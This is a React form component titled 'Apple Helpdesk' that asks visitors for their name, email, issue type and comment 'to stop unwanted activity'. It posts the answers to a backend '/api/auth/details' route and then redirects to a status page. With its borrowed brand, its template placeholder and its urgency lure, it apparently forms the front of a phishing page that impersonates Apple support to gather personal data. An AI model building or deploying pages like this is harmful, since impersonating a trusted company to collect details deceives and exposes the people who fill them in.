import { Button, Form, Input, Select } from 'antd';
import { useState } from 'react';
import axios from 'axios';
import { backendURL } from '../../utils/env';
import { message } from 'antd';
import { useNavigate } from "react-router-dom"

const App = () => {
    const [isLoading, setIsloading] = useState(false)
    const navigate = useNavigate()

    const onFinish = (values) => {
        console.log('Success:', values);
        login(values)
    };

    const onFinishFailed = (errorInfo) => {
        console.log('Failed:', errorInfo);
    };

    const login = async (values) => {
        try {
            setIsloading(true)
            const config = {
                headers: {
                    "Content-Type": "application/json",
                    'Access-Control-Allow-Origin': '*',
                },
            };
            await axios.post(`${backendURL}/api/auth/details`, values, config)
            navigate('/status')
        } catch (error) {
            const messages = error?.response?.data?.message || error?.message || error?.toString();
            message.error(messages)
            setIsloading(false)
        }
        setIsloading(false)
    }

    return (
        <div className='flex flex-col justify-center items-center'>
            <div className='font-semibold my-5 text-[20px] text-center'>Apple Helpdesk: Please enter the details below to stop unwanted [activity/messages/etc.].</div>
            <div className='w-full'>
                <Form
                    name="basic"
                    layout='vertical'
                    onFinish={onFinish}
                    onFinishFailed={onFinishFailed}
                    size='large'
                >
                    <Form.Item style={{ borderRadius: '10px' }}
                        // label="Username"
                        name="First Name"
                        rules={[
                            {
                                required: true,
                                message: 'Please input your first name!',
                            },
                        ]}
                    >
                        <Input placeholder='First name' />
                    </Form.Item>
                    <Form.Item style={{ borderRadius: '10px' }}
                        // label="Username"
                        name="Name"
                        rules={[
                            {
                                required: true,
                                message: 'Please input your last name!',
                            },
                        ]}
                    >
                        <Input placeholder='Last name' />
                    </Form.Item>

                    <Form.Item style={{ borderRadius: '10px' }}
                        name="email"
                        rules={[
                            {
                                required: true,
                                message: 'Please input your email!',
                                type: 'email'
                            },
                        ]}
                    >
                        <Input placeholder='Email' />
                    </Form.Item>
                    <Form.Item
                        name="Issue"
                        // label="Gender"
                        rules={[
                            {
                                required: true,
                            },
                        ]}
                    >
                        <Select placeholder="Please select your issue">
                            <Option value="Unwanted SMS">Unwanted SMS</Option>
                            <Option value="Unwanted call">Unwanted call</Option>
                            <Option value="Unwanted call and SMS">Unwanted call and SMS</Option>
                        </Select>
                    </Form.Item>
                    <Form.Item
                        name="Comment"
                    // label="Gender"
                    // rules={[
                    //     {
                    //         required: true,
                    //     },
                    // ]}
                    >
                        <Input.TextArea placeholder='Comment' row={4}  />

                    </Form.Item>
                    <Form.Item>
                        <Button loading={isLoading} style={{ background: '#000', width: "100%" }} type="primary" htmlType="submit">
                            Submit
                        </Button>
                    </Form.Item>
                </Form>
            </div>
        </div>
    );
}

export default App;